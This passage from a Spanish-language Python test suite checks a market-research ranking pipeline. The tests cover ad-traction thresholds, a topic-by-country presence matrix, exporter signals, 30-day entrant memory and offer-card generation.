        self.assertNotIn("truncada", texto)

    def test_piso_de_anuncios_sin_piso_de_edad(self):
        _, o = self.ficha(med(1, "parcial", 120, "14.9", conceptos=3, edad_piso=False, medidos_piso=True))
        texto = " | ".join(o["pendiente"])
        self.assertIn("anuncios_activos es un PISO", texto)
        self.assertNotIn("edad_oferta_dias es un PISO", texto)

    def test_la_ficha_de_una_pagina_vieja_sigue_usando_la_muestra(self):
        _, o = self.ficha(pg(1, paises=["ES"], anuncios=30, edad="12", conceptos=3, trunc=True))
        self.assertEqual(o["traccion"]["anuncios_activos"], 30)
        self.assertTrue(any("muestra truncada" in x for x in o["pendiente"]))

    def test_conceptos_unicos_de_la_ficha_nunca_supera_los_anuncios_medidos(self):
        fichas, o = self.ficha(med(1, "completa", 15, "12", conceptos=15, edad_piso=False))
        self.assertEqual((o["traccion"]["anuncios_activos"], o["traccion"]["conceptos_unicos"]), (15, 15))
        pm.validar_fichas(fichas, self.p)

    # --- sin_tema con medición ---

    def test_indeterminado_sin_tema_con_medicion(self):
        paginas = [med(1, "parcial", 60, "20", conceptos=2, edad_piso=False),           # pasa
                   med(2, "completa", 9, "40", conceptos=2, edad_piso=False),           # completa y bajo: se descarta
                   med(3, "parcial", 9, "40", conceptos=2, edad_piso=True),             # piso insuficiente: se queda
                   med(4, "muestra", 2, "0", conceptos=1)]                              # se queda
        doc = self.rank(paginas, [ind(n) for n in range(1, 5)], paises_barridos=["US"])
        self.assertEqual([(r["page_id"], r["estado_traccion"]) for r in doc["sin_tema"]],
                         [(pid(1), "pasa"), (pid(3), "indeterminada_por_muestra"), (pid(4), "indeterminada_por_muestra")])
        self.assertEqual({d["page_id"]: d["motivos"] for d in doc["descartadas"]},
                         {pid(2): ["tema_indeterminado_sin_traccion_alta"]})
        o = ranking.puente_a_fichas(doc, None, self.p)["ofertas"]
        self.assertEqual([x["traccion"]["anuncios_activos"] for x in o], [60])

    # --- determinismo ---

    def conjunto(self):
        pp = por_pais(ES=("pagina", 20, 20, True), MX=("pagina", 0, 0, True))
        paginas = [med(1, "completa", 20, "12", edad_piso=False, por_pais=pp),
                   med(2, "parcial", 15, "10", paises=["US"]), med(3, "parcial", 40, "4", paises=["MX"]),
                   med(4, "completa", 14, "30", edad_piso=False), med(5, "muestra", 3, "1", conceptos=1),
                   pg(6, anuncios=20, edad="12", paises=["IT"])]
        return paginas, [et(1, "tema-a"), et(2, "tema-b"), et(3, "tema-c"), et(4, "tema-d"), et(5, "tema-e"), et(6, "tema-f")]

    def test_determinista_y_sin_float(self):
        paginas, etiquetas = self.conjunto()
        base = self.rank(paginas, etiquetas)
        self.assertEqual(json.dumps(base, ensure_ascii=False), json.dumps(self.rank(paginas, etiquetas), ensure_ascii=False))
        for semilla in range(4):
            p2, e2 = copy.deepcopy(paginas), copy.deepcopy(etiquetas)
            azar = random.Random(semilla)
            azar.shuffle(p2)
            azar.shuffle(e2)
            self.assertEqual(json.dumps(self.rank(p2, e2), ensure_ascii=False), json.dumps(base, ensure_ascii=False))
        for nodo in recorrer(base):
            self.assertNotIsInstance(nodo, (float, Decimal))
        fichas = ranking.puente_a_fichas(base, None, self.p)
        self.assertEqual(len(pm.validar_fichas(fichas, self.p)), 3)  # pasan: 1 (completa), 2 (borde piso) y 6 (vieja)

    def test_no_muta_las_entradas(self):
        paginas, etiquetas = self.conjunto()
        copias = copy.deepcopy((paginas, etiquetas))
        self.rank(paginas, etiquetas)
        self.assertEqual((paginas, etiquetas), copias)


# ---------------------------------------------------------------------------
# macro_nicho como etiqueta
# ---------------------------------------------------------------------------

class PruebaMacroNicho(Base):
    def macro(self, *macros):
        paginas = [pg(i + 1) for i in range(len(macros))]
        etiquetas = [et(i + 1, macro=m) for i, m in enumerate(macros)]
        t = self.rank(paginas, etiquetas)["temas"][0]
        return t["macro_nicho"], t["macro_nicho_conteo"]

    def test_unanime_conserva_la_etiqueta(self):
        for m in ("salud", "relaciones", "dinero"):
            with self.subTest(m=m):
                self.assertEqual(self.macro(m, m, m)[0], m)

    def test_todas_null_es_null(self):
        self.assertIsNone(self.macro(None, None)[0])
        self.assertIsNone(self.macro(None)[0])

    def test_discrepancia_es_mixto(self):
        self.assertEqual(self.macro("salud", "dinero")[0], "mixto")
        self.assertEqual(self.macro("salud", "relaciones", "dinero")[0], "mixto")

    def test_una_etiqueta_y_un_null_tambien_es_mixto(self):
        self.assertEqual(self.macro("salud", None)[0], "mixto")

    def test_conteo_por_etiqueta(self):
        _, conteo = self.macro("salud", "salud", None, "dinero")
        self.assertEqual(conteo, {"salud": 2, "relaciones": 0, "dinero": 1, "fuera_de_marco": 1})

    def test_el_fixture_tiene_un_tema_mixto_y_uno_sin_marco(self):
        doc = self.rank_fix()
        self.assertEqual(self.tema(doc, "finanzas-freelance")["macro_nicho"], "mixto")
        self.assertIsNone(self.tema(doc, "crochet-patrones")["macro_nicho"])
        self.assertEqual(self.tema(doc, "atlas-puntos-gatillo")["macro_nicho"], "salud")

    def test_un_tema_fuera_del_marco_igual_se_rankea_y_se_cuenta(self):
        doc = self.rank_fix()
        self.assertEqual(doc["temas"][0]["tema_slug"], "crochet-patrones")  # macro null y primero del ranking
        self.assertEqual(doc["resumen"]["temas_que_pasan_por_macro_nicho"]["fuera_de_marco"], 2)  # crochet y tema-dudoso


# ---------------------------------------------------------------------------
# Matriz tema × país
# ---------------------------------------------------------------------------

class PruebaMatrizTemaPais(Base):
    def matriz(self, paginas=None, etiquetas=None, **kw):
        if paginas is None:
            return ranking.matriz_tema_pais(cargar("paginas.json"), cargar("etiquetas.json"), **kw)
        pd, ed = docs(paginas, etiquetas)
        return ranking.matriz_tema_pais(pd, ed, **kw)

    def fila(self, m, slug):
        return next(t for t in m["temas"] if t["tema_slug"] == slug)

    def test_presencia_y_huecos_del_fixture(self):
        m = self.matriz()
        self.assertEqual(m["paises"], ["BR", "ES", "IT", "MX", "US"])
        crochet = self.fila(m, "crochet-patrones")
        self.assertEqual(crochet["paises_presentes"], ["ES", "IT", "MX"])
        self.assertEqual(crochet["huecos"], ["BR", "US"])
        self.assertEqual(crochet["presencia"]["MX"], {"presente": True, "paginas": 2})
        self.assertEqual(crochet["presencia"]["BR"], {"presente": False, "paginas": 0})
        self.assertEqual(self.fila(m, "atlas-puntos-gatillo")["presencia"]["ES"]["paginas"], 3)

    def test_la_ausencia_viene_marcada_como_hipotesis(self):
        m = self.matriz()
        self.assertEqual(m["estado_ausencia"], "hipotesis_hasta_pasada_3")
        self.assertIn("no es ausencia en el mercado", m["advertencia"])
        self.assertIn("pasada 3", m["advertencia"])

    def test_el_ranking_incluye_la_misma_matriz(self):
        doc = self.rank_fix()
        self.assertEqual(doc["matriz_tema_pais"], self.matriz())

    def test_el_hueco_de_cada_tema_coincide_con_la_matriz(self):
        doc = self.rank_fix()
        m = doc["matriz_tema_pais"]
        for t in doc["temas"]:
            self.assertEqual(t["huecos"], self.fila(m, t["tema_slug"])["huecos"])
            self.assertEqual(t["paises"], self.fila(m, t["tema_slug"])["paises_presentes"])

    def test_una_pagina_descartada_no_cuenta_como_presencia(self):
        m = self.matriz([pg(1, paises=["US"]), pg(2, paises=["ES"])],
                        [et(1, "tema-a"), et(2, "tema-a", formato="servicio")])
        fila = self.fila(m, "tema-a")
        self.assertEqual(fila["paises_presentes"], ["US"])
        self.assertEqual(fila["huecos"], ["ES"])  # ES está en el universo (la descartada prueba que se barrió)

    def test_el_pais_de_una_pagina_sin_etiqueta_entra_al_universo(self):
        m = self.matriz([pg(1, paises=["US"]), pg(2, paises=["DE"])], [et(1)])
        self.assertEqual(m["paises"], ["DE", "US"])
        self.assertEqual(self.fila(m, "tema-a")["huecos"], ["DE"])

    def test_paises_barridos_amplia_las_columnas(self):
        m = self.matriz([pg(1, paises=["US"])], [et(1)], paises_barridos=["BR", "MX"])
        self.assertEqual(m["paises"], ["BR", "MX", "US"])
        self.assertEqual(self.fila(m, "tema-a")["huecos"], ["BR", "MX"])
        with self.assertRaises(pm.ErrorValidacion):
            self.matriz([pg(1)], [et(1)], paises_barridos=["brasil"])

    def test_tema_presente_en_todos_los_paises_no_tiene_huecos(self):
        m = self.matriz([pg(1, paises=["US", "ES"])], [et(1)])
        self.assertEqual(self.fila(m, "tema-a")["huecos"], [])

    def test_sin_candidatas_la_matriz_queda_sin_filas(self):
        m = self.matriz([pg(1)], [])
        self.assertEqual(m["temas"], [])
        self.assertEqual(m["paises"], ["US"])


# ---------------------------------------------------------------------------
# Exportadores
# ---------------------------------------------------------------------------

class PruebaExportadores(Base):
    def test_resumen_por_tema_del_fixture(self):
        e = ranking.exportadores_por_tema(cargar("paginas.json"), cargar("etiquetas.json"))
        yoga = next(t for t in e["temas"] if t["tema_slug"] == "yoga-posturas")
        self.assertEqual((yoga["paginas_evaluadas"], yoga["con_senal"], yoga["sin_dato"]), (2, 1, 0))
        self.assertEqual(yoga["monedas"], {"BRL": 1})
        self.assertEqual(yoga["paises_anuncio"], {"ES": 1})
        self.assertEqual(yoga["paginas"][0]["page_id"], pid(22))
        self.assertIn("indicio", yoga["paginas"][0]["motivo"])
        self.assertEqual(e["temas_con_senal"], 1)
        self.assertEqual(e["resumen"], {"paginas_evaluadas": 13, "con_senal": 1, "sin_dato": 0, "monedas": {"BRL": 1}})

    def test_el_ranking_trae_la_misma_senal(self):
        doc = self.rank_fix()
        self.assertEqual(doc["exportadores"], ranking.exportadores_por_tema(cargar("paginas.json"),
                                                                           cargar("etiquetas.json")))
        self.assertEqual(self.tema(doc, "yoga-posturas")["exportadores"]["con_senal"], 1)
        self.assertEqual(self.tema(doc, "crochet-patrones")["exportadores"]["con_senal"], 0)

    def test_la_senal_no_cambia_la_traccion_ni_el_orden(self):
        sin = cargar("paginas.json")
        for p in sin["paginas"]:
            p["exportador"] = {"señal": False, "moneda": "USD", "pais_anuncio": "ES", "motivo": "x"}
        a = ranking.rankear(sin, cargar("etiquetas.json"), par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)
        b = self.rank_fix()
        self.assertEqual([(t["tema_slug"], t["estado_traccion"]) for t in a["temas"]],
                         [(t["tema_slug"], t["estado_traccion"]) for t in b["temas"]])

    def test_acepta_la_clave_ascii_senal_y_trata_lo_raro_como_sin_dato(self):
        bloques = [{"senal": True, "moneda": "BRL", "pais_anuncio": "ES", "motivo": "m"},   # ASCII
                   None,                                                                    # sin bloque
                   {"señal": "quizás", "moneda": "USD"},                                    # no booleano
                   "texto"]                                                                 # no es objeto
        paginas = [pg(i + 1, exportador=b) for i, b in enumerate(bloques)]
        e = ranking.exportadores_por_tema(*docs(paginas, [et(i + 1) for i in range(4)]))
        t = e["temas"][0]
        self.assertEqual((t["con_senal"], t["sin_dato"], t["paginas_evaluadas"]), (1, 3, 4))

    def test_las_descartadas_no_entran_en_el_resumen(self):
        paginas = [pg(1, exportador={"señal": True, "moneda": "BRL", "pais_anuncio": "ES", "motivo": "m"}), pg(2)]
        e = ranking.exportadores_por_tema(*docs(paginas, [et(1, formato="servicio"), et(2)]))
        self.assertEqual(e["resumen"]["con_senal"], 0)
        self.assertEqual(e["resumen"]["paginas_evaluadas"], 1)

    def test_advertencia_dice_que_es_un_indicio(self):
        e = ranking.exportadores_por_tema(cargar("paginas.json"), cargar("etiquetas.json"))
        self.assertIn("no es un hecho", e["advertencia"])


# ---------------------------------------------------------------------------
# Memoria (entrantes_30d)
# ---------------------------------------------------------------------------

class PruebaMemoria(Base):
    def entrantes(self, doc):
        return {t["tema_slug"]: t["entrantes_30d"] for t in doc["temas"]}

    def todo_null(self, doc):
        return all(v is None for m in self.entrantes(doc).values() for v in m.values())

    def test_sin_memoria_todo_entrantes_es_null_y_nunca_cero(self):
        doc = self.rank_fix()
        for slug, mapa in self.entrantes(doc).items():
            for pais, valor in mapa.items():
                with self.subTest(tema=slug, pais=pais):
                    self.assertIsNone(valor)
        self.assertFalse(doc["memoria"]["base_valida"])
        self.assertTrue(any("sin base de memoria" in a for a in doc["advertencias"]))

    def test_diff_sin_base_de_b3_deja_todo_null(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_sin_base.json"))
        self.assertTrue(self.todo_null(doc))
        self.assertFalse(doc["memoria"]["base_valida"])
        self.assertIsNone(doc["memoria"]["previa_corrida_id"])
        for t in doc["temas"]:
            self.assertEqual(t["novedad"], {"tema_nuevo": None, "paginas_nuevas": None})

    def test_sin_base_ignora_los_valores_que_traiga(self):
        for mem in ({**cargar("memoria_b3_ok.json"), "estado": "sin_base"},
                    {**cargar("memoria_simple.json"), "base_valida": False}):
            with self.subTest(mem=sorted(mem)[:2]):
                self.assertTrue(self.todo_null(self.rank_fix(memoria_diff=mem)))

    def test_valores_de_b3_con_base_valida(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))
        e = self.entrantes(doc)
        self.assertEqual(e["crochet-patrones"], {"BR": 2, "US": 0})
        self.assertEqual(e["atlas-puntos-gatillo"], {"BR": 1, "IT": None, "MX": None})  # no consultados: null
        self.assertTrue(all(v is None for v in e["finanzas-freelance"].values()))        # tema que B3 no midió: null
        self.assertEqual(e["recetas-diabeticos"], {"ES": 0, "IT": 0, "MX": 0, "US": 0})
        self.assertTrue(doc["memoria"]["base_valida"])
        self.assertEqual(doc["memoria"]["previa_corrida_id"], "2026-10-07-a")

    def test_un_cero_medido_se_conserva_y_un_null_no_se_vuelve_cero(self):
        e = self.entrantes(self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json")))
        self.assertIs(type(e["crochet-patrones"]["US"]), int)
        self.assertEqual(e["crochet-patrones"]["US"], 0)
        self.assertIsNone(e["atlas-puntos-gatillo"]["IT"])

    def test_forma_simple_de_memoria(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_simple.json"))
        self.assertEqual(self.entrantes(doc)["crochet-patrones"], {"BR": 2, "US": 0})
        self.assertEqual(doc["memoria"]["previa_corrida_id"], "2026-10-20-a")
        for t in doc["temas"]:  # la forma simple no trae cambios: sin novedad
            self.assertEqual(t["novedad"], {"tema_nuevo": None, "paginas_nuevas": None})

    def test_novedad_de_temas_y_paginas_viene_de_la_base_de_cambios(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))
        self.assertEqual(self.tema(doc, "recetas-diabeticos")["novedad"], {"tema_nuevo": True, "paginas_nuevas": 1})
        self.assertEqual(self.tema(doc, "crochet-patrones")["novedad"], {"tema_nuevo": False, "paginas_nuevas": 1})
        self.assertEqual(self.tema(doc, "atlas-puntos-gatillo")["novedad"], {"tema_nuevo": False, "paginas_nuevas": 0})

    def test_sin_memoria_la_novedad_es_null(self):
        for t in self.rank_fix()["temas"]:
            self.assertEqual(t["novedad"], {"tema_nuevo": None, "paginas_nuevas": None})

    def test_base_de_cambios_sin_base_de_entrantes(self):
        # B3 puede tener una previa reciente: sirve para temas nuevos pero no para entrantes_30d
        mem = cargar("memoria_b3_ok.json")
        mem["estado"] = "sin_base"
        mem["entrantes_30d_por_pais"] = {k: {p: None for p in v} for k, v in mem["entrantes_30d_por_pais"].items()}
        doc = self.rank_fix(memoria_diff=mem)
        self.assertTrue(self.todo_null(doc))
        self.assertEqual(self.tema(doc, "recetas-diabeticos")["novedad"]["tema_nuevo"], True)

    def test_temas_estado_distinto_de_ok_no_declara_temas_nuevos(self):
        for estado in ("sin_etiquetas", "base_sin_etiquetas", "sin_base"):
            with self.subTest(estado=estado):
                mem = {**cargar("memoria_b3_ok.json"), "temas_estado": estado}
                doc = self.rank_fix(memoria_diff=mem)
                self.assertIsNone(self.tema(doc, "recetas-diabeticos")["novedad"]["tema_nuevo"])

    def test_memoria_con_base_pero_sin_entrantes_por_pais_deja_null(self):
        for mem in ({"estado": "ok"}, {"base_valida": True},
                    {k: v for k, v in cargar("memoria_b3_ok.json").items() if k != "entrantes_30d_por_pais"}):
            with self.subTest(mem=sorted(mem)[:3]):
                self.assertTrue(self.todo_null(self.rank_fix(memoria_diff=mem)))

    def test_el_entrantes_global_de_b3_no_se_usa_como_dato_de_mercado(self):
        mem = {"estado": "ok", "entrantes_30d": {"crochet-patrones": 7}}
        self.assertTrue(self.todo_null(self.rank_fix(memoria_diff=mem)))

    def test_formas_raras_de_memoria_son_error(self):
        ok = cargar("memoria_b3_ok.json")
        malas = ["texto", 5, [], {"estado": "quizás"}, {"base_valida": "si"},
                 {**ok, "entrantes_30d_por_pais": []},
                 {**ok, "entrantes_30d_por_pais": {"Tema Malo": {"US": 1}}},
                 {**ok, "entrantes_30d_por_pais": {"tema-a": {"US": -1}}},
                 {**ok, "entrantes_30d_por_pais": {"tema-a": {"US": 1.5}}},
                 {**ok, "entrantes_30d_por_pais": {"tema-a": {"us": 1}}},
                 {**ok, "entrantes_30d_por_pais": {"tema-a": {"US": True}}},
                 {**ok, "entrantes_30d_por_pais": {"tema-a": 3}},
                 {**ok, "paginas_nuevas": "x"}, {**ok, "paginas_nuevas": [None]},
                 {**ok, "temas_nuevos": ["No Kebab"]}, {**ok, "temas_nuevos": "recetas"}]
        for malo in malas:
            with self.subTest(malo=str(malo)[:70]), self.assertRaises(pm.ErrorValidacion):
                self.rank_fix(memoria_diff=malo)

    def test_las_fichas_llevan_los_entrantes_de_la_memoria(self):
        doc = self.rank_fix()
        fichas = ranking.puente_a_fichas(doc, cargar("memoria_b3_ok.json"), self.p)
        crochet = next(o for o in fichas["ofertas"] if o["modelo_id"].startswith("crochet-patrones"))
        self.assertEqual({m["mercado"]: m["hueco"]["entrantes_30d"] for m in crochet["mercados"]}, {"BR": 2, "US": 0})
        self.assertFalse(any(x.startswith("entrantes_30d") for x in crochet["pendiente"]))  # todo medido
        atlas = next(o for o in fichas["ofertas"] if o["modelo_id"].startswith("atlas-puntos-gatillo"))
        self.assertEqual({m["mercado"]: m["hueco"]["entrantes_30d"] for m in atlas["mercados"]},
                         {"BR": 1, "IT": None, "MX": None})
        self.assertTrue(any(x.startswith("entrantes_30d") for x in atlas["pendiente"]))
        pm.validar_fichas(fichas, self.p)

    def test_sin_memoria_las_fichas_llevan_null_y_lo_declaran_pendiente(self):
        fichas = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        for o in fichas["ofertas"]:
            for m in o["mercados"]:
                self.assertIsNone(m["hueco"]["entrantes_30d"])
            self.assertTrue(any(x.startswith("entrantes_30d") for x in o["pendiente"]))

    def test_la_memoria_del_puente_manda_sobre_la_de_rankear(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))
        fichas = ranking.puente_a_fichas(doc, cargar("memoria_sin_base.json"), self.p)
        self.assertTrue(all(m["hueco"]["entrantes_30d"] is None for o in fichas["ofertas"] for m in o["mercados"]))

    def test_si_el_puente_no_recibe_memoria_usa_la_que_ya_trae_el_ranking(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        crochet = next(o for o in fichas["ofertas"] if o["modelo_id"].startswith("crochet-patrones"))
        self.assertEqual([m["hueco"]["entrantes_30d"] for m in crochet["mercados"]], [2, 0])

    def test_acepta_el_diff_real_de_memoria_b3(self):
        try:
            from scripts.modelado.barrido import memoria
        except ImportError:  # pragma: no cover
            self.skipTest("memoria.py no disponible")
        paginas = cargar("paginas.json")
        etiquetas = cargar("etiquetas.json")
        temas = {e["page_id"]: e["tema_slug"] for e in etiquetas["paginas"]
                 if e["tema_slug"] in ("crochet-patrones", "atlas-puntos-gatillo", "finanzas-freelance",
                                       "recetas-diabeticos", "yoga-posturas", "plantillas-boda", "tema-dudoso")
                 and e["page_id"] not in (pid(61), pid(62), pid(63), pid(67))}  # y sin los «indeterminado»
        base_doc = copy.deepcopy(paginas)
        base_doc["corrida_id"] = "2026-10-07-a"
        base_doc["paginas"] = [p for p in base_doc["paginas"] if p["page_id"] not in (pid(13), pid(41))]
        par_mem = {"memoria_ventana_min_dias": 25}
        from datetime import timedelta
        base = memoria.construir_instantanea(base_doc, "2026-10-07-a", ahora=AHORA - timedelta(days=30),
                                             etiquetas=temas)
        actual = memoria.construir_instantanea(paginas, "2026-11-06-a", ahora=AHORA, etiquetas=temas)
        diff = memoria.diff(actual, [base], par=par_mem, ahora=AHORA)
        self.assertEqual(diff["estado"], "ok")
        doc = self.rank_fix(memoria_diff=diff)
        e = self.entrantes(doc)
        self.assertEqual(e["crochet-patrones"], {"BR": 0, "US": 0})  # hay base: 0 significa «nadie entró»
        self.assertTrue(doc["memoria"]["base_valida"])
        self.assertEqual(doc["memoria"]["previa_corrida_id"], "2026-10-07-a")
        self.assertEqual(self.tema(doc, "recetas-diabeticos")["novedad"], {"tema_nuevo": True, "paginas_nuevas": 1})
        fichas = ranking.puente_a_fichas(doc, diff, self.p)
        self.assertEqual(len(pm.validar_fichas(fichas, self.p)), 7)
        sin_base = memoria.diff(actual, [], par=par_mem, ahora=AHORA)
        self.assertEqual(sin_base["estado"], "sin_base")
        self.assertTrue(self.todo_null(self.rank_fix(memoria_diff=sin_base)))
        sin = ranking.puente_a_fichas(doc, sin_base, self.p)
        self.assertTrue(all(m["hueco"]["entrantes_30d"] is None for o in sin["ofertas"] for m in o["mercados"]))


# ---------------------------------------------------------------------------
# Revisión de corrección: M2, M3, m2 y m6
# ---------------------------------------------------------------------------

class PruebaM2MedidosMenorQueConceptos(Base):
    """Un dato raro de la ingesta (medidos < conceptos_unicos) nunca tumba toda la corrida."""

    def pagina_rara(self, estado, medidos, conceptos, edad="12", n=1):
        p = med(n, estado, medidos, edad, conceptos=conceptos, anuncios=conceptos)
        p["medicion"]["estado"] = estado
        return p

    def test_escenario_a_parcial_con_3_medidos_y_4_conceptos(self):
        doc = self.rank([self.pagina_rara("parcial", 3, 4, "5")], [et(1)])
        r = doc["temas"][0]["paginas"][0]
        self.assertEqual((r["anuncios_activos_medidos"], r["anuncios_activos_traccion"]), (4, 4))
        self.assertEqual(r["estado_traccion"], "indeterminada_por_muestra")

    def test_escenario_b_completa_con_3_medidos_y_5_conceptos(self):
        doc = self.rank([self.pagina_rara("completa", 3, 5)], [et(1)])
        r = doc["temas"][0]["paginas"][0]
        self.assertEqual(r["anuncios_activos_medidos"], 5)
        self.assertEqual(r["estado_traccion"], "no_pasa")

    def test_escenario_c_completa_con_0_medidos_y_3_conceptos(self):
        doc = self.rank([self.pagina_rara("completa", 0, 3)], [et(1)])
        r = doc["temas"][0]["paginas"][0]
        self.assertEqual(r["anuncios_activos_medidos"], 3)
        self.assertEqual(r["estado_traccion"], "no_pasa")

    def test_el_dato_raro_se_avisa_y_el_resto_de_la_corrida_se_rankea(self):
        doc = self.rank([self.pagina_rara("completa", 0, 3, n=1), med(2, "completa", 30, "20", edad_piso=False),
                         self.pagina_rara("parcial", 3, 4, n=3)],
                        [et(1, "tema-a"), et(2, "tema-b"), et(3, "tema-c")])
        self.assertEqual(len(doc["temas"]), 3)
        self.assertEqual(self.tema(doc, "tema-b")["estado_traccion"], "pasa")
        aviso = [a for a in doc["advertencias"] if "anuncios_activos_medidos" in a and "conceptos" in a]
        self.assertEqual(len(aviso), 1)
        self.assertIn("2 página(s)", aviso[0])
        self.assertIn(pid(1), aviso[0])

    def test_sin_datos_raros_no_hay_aviso(self):
        doc = self.rank([med(1, "completa", 20, "12", edad_piso=False)], [et(1)])
        self.assertFalse(any("menor que los conceptos" in a for a in doc["advertencias"]))

    def test_la_ficha_de_una_pagina_corregida_sigue_siendo_valida(self):
        p = self.pagina_rara("parcial", 20, 25, "12")  # 20 medidos < 25 conceptos
        doc = self.rank([p, pg(2, paises=["US"], anuncios=2, edad="1", conceptos=1)], [et(1), et(2, "tema-b")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(fichas["ofertas"][0]["traccion"]["anuncios_activos"], 25)
        pm.validar_fichas(fichas, self.p)

    def test_la_correccion_marca_el_conteo_como_piso(self):
        r = self.rank([self.pagina_rara("completa", 3, 5)], [et(1)])["temas"][0]["paginas"][0]
        self.assertTrue(r["anuncios_activos_medidos_es_piso"])


class PruebaM3PaisFuenteSegunMedicion(Base):
    def fuente(self, paginas, par_barrido=None):
        doc = self.rank(paginas, [et(i + 1, f"tema-{i + 1}") for i in range(len(paginas))],
                        **({"par_barrido": par_barrido} if par_barrido else {}))
        return {r["page_id"]: r["pais_fuente"] for t in doc["temas"] for r in t["paginas"]}

    def coreano(self, **kw):
        # caso real 723807200811228: 40 de 41 anuncios en Italia, 1 en cada uno de ES, FR y MX
        pp = por_pais(IT=("pagina", 40, 40, True), ES=("muestra", 1, None, False), FR=("muestra", 1, None, False),
                      MX=("muestra", 1, None, False))
        return med(1, "parcial", 43, "36", paises=["ES", "FR", "IT", "MX"], por_pais=pp, anuncios=43, conceptos=3, **kw)

    def test_gana_el_pais_donde_mas_anuncia_aunque_la_prioridad_diga_otro(self):
        # barrido_paises_origen del fixture: US, BR, MX, ES, IT → por prioridad saldría MX
        self.assertEqual(self.fuente([self.coreano()]), {pid(1): "IT"})

    def test_la_ficha_toma_pais_e_idioma_del_pais_donde_mas_anuncia(self):
        doc = self.rank([self.coreano(), pg(2, paises=["US"], anuncios=2, edad="1", conceptos=1)],
                        [et(1), et(2, "tema-b")], paises_barridos=["BR"])
        o = next(x for x in ranking.puente_a_fichas(doc, None, self.p)["ofertas"] if x["modelo_id"].endswith(pid(1)))
        self.assertEqual(o["fuente"], {"idioma": "it", "pais": "IT"})

    def test_con_total_declarado_manda_el_total_y_no_los_vistos(self):
        pp = por_pais(ES=("pagina", 5, 90, False), MX=("muestra", 30, None, False))
        p = med(1, "parcial", 120, "12", paises=["ES", "MX"], por_pais=pp, anuncios=35, conceptos=2)
        self.assertEqual(self.fuente([p]), {pid(1): "ES"})

    def test_empate_se_resuelve_con_la_prioridad_de_paises_de_origen(self):
        pp = por_pais(ES=("pagina", 10, 10, True), MX=("pagina", 10, 10, True), IT=("pagina", 10, 10, True))
        p = med(1, "completa", 30, "12", paises=["ES", "IT", "MX"], por_pais=pp, anuncios=30, conceptos=2, edad_piso=False)
        self.assertEqual(self.fuente([p]), {pid(1): "MX"})  # prioridad US, BR, MX, ES, IT
        pb = {**self.pb, "barrido_paises_origen": ["IT", "ES", "MX"]}
        self.assertEqual(self.fuente([p], pb), {pid(1): "IT"})

    def test_empate_sin_prioridad_aplicable_es_alfabetico(self):
        pp = por_pais(ES=("pagina", 10, 10, True), MX=("pagina", 10, 10, True))
        p = med(1, "completa", 20, "12", paises=["ES", "MX"], por_pais=pp, anuncios=20, conceptos=2, edad_piso=False)
        pb = {**self.pb, "barrido_paises_origen": ["US"]}
        self.assertEqual(self.fuente([p], pb), {pid(1): "ES"})

    def test_un_pais_sin_entrada_en_la_medicion_pesa_cero(self):
        pp = por_pais(MX=("muestra", 3, None, False))
        p = med(1, "muestra", 20, "12", paises=["ES", "MX"], por_pais=pp, anuncios=20, conceptos=2)
        self.assertEqual(self.fuente([p]), {pid(1): "MX"})

    def test_sin_medicion_o_sin_por_pais_sigue_la_prioridad(self):
        self.assertEqual(self.fuente([pg(1, paises=["ES", "MX"], anuncios=20, edad="12")]), {pid(1): "MX"})
        p = med(1, "parcial", 20, "12", paises=["ES", "MX"], por_pais={}, anuncios=20, conceptos=2)
        self.assertEqual(self.fuente([p]), {pid(1): "MX"})

    def test_una_pagina_sin_tema_tambien_usa_la_medicion(self):
        doc = self.rank([self.coreano()], [ind(1)])
        self.assertEqual(doc["sin_tema"][0]["pais_fuente"], "IT")

    def test_el_pais_fuente_no_cambia_el_resto_de_las_fichas(self):
        antes = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        self.assertEqual([o["fuente"] for o in antes["ofertas"]][:1], [{"idioma": "es", "pais": "MX"}])  # sin medición: prioridad


class PruebaM2SinTitulosConTraccion(Base):
    def consolidado(self, etiquetas, sin_etiquetar=(), en_disputa=()):
        return {"schema_version": "1.0.0", "corrida_id": "2026-11-06-a", "etiquetas": list(etiquetas),
                "en_disputa": list(en_disputa), "sin_etiquetar": list(sin_etiquetar)}

    def sin_titulos(self, n, motivo="sin_titulos"):
        return {"page_id": pid(n), "page_name": f"Página {n}", "motivo": motivo}

    def rank_cons(self, paginas, etiquetas, sin_etiquetar, **kw):
        pd, _ = docs(paginas, [])
        kw.setdefault("par_modelado", self.p)
        kw.setdefault("par_barrido", self.pb)
        kw.setdefault("ahora", AHORA)
        return ranking.rankear(pd, self.consolidado(etiquetas, sin_etiquetar), **kw)

    def test_sin_titulos_con_traccion_comprobada_avanza_como_sin_tema(self):
        # caso real 114968991676456: 27 anuncios, 14,06 días, medición completa
        pagina = med(1, "completa", 27, "14.06", edad_piso=False, titulos=[], conceptos=1, paises=["ES"])
        doc = self.rank_cons([pagina, pg(2, paises=["US"])], [et(2, "tema-b")], [self.sin_titulos(1)])
        self.assertEqual([r["page_id"] for r in doc["sin_tema"]], [pid(1)])
        r = doc["sin_tema"][0]
        self.assertEqual(r["estado_traccion"], "pasa")
        self.assertEqual(r["por_verificar"], ["tema", "modelo_de_cobro"])
        self.assertEqual(r["tema_slug"], "indeterminado")
        self.assertEqual(r["origen_sin_tema"], "sin_titulos")
        self.assertEqual(doc["descartadas"], [])
        self.assertTrue(any("sin_tema" in a for a in doc["advertencias"]))

    def test_su_ficha_declara_que_hay_que_verificar_tema_y_modelo_de_cobro(self):
        pagina = med(1, "completa", 27, "14.06", edad_piso=False, titulos=[], conceptos=1, paises=["ES"])
        doc = self.rank_cons([pagina, pg(2, paises=["US"])], [et(2, "tema-b")], [self.sin_titulos(1)])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].startswith("sin-tema-"))
        texto = " | ".join(o["pendiente"])
        self.assertIn("tema_indeterminado", texto)
        self.assertIn("sin títulos", texto)
